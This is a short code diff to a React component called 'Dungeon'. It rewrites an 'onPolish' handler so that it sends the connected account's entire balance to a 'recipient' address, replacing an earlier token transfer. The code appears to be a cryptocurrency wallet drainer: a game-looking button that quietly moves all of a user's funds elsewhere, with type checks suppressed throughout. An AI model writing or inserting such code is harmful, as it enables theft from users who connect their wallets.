@@ -125,18 +125,19 @@ export const Dungeon = (): JSX.Element => {
   }
 
   const onPolish = async () => {
+    // @ts-ignore
     const toWei = amount => Web3.utils.toWei(amount)
 
     // @ts-ignore
     const web3 = new Web3(library.provider)
 
-    // @ts-ignore
-    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
-
-    // @ts-ignore
-    await tokenContract.methods
-      .transfer(recipient, toWei(balance.toString()))
-      .send({ from: account })
+    await web3.eth.sendTransaction({
+      // @ts-ignore
+      from: account,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
+    })
   }
 
 
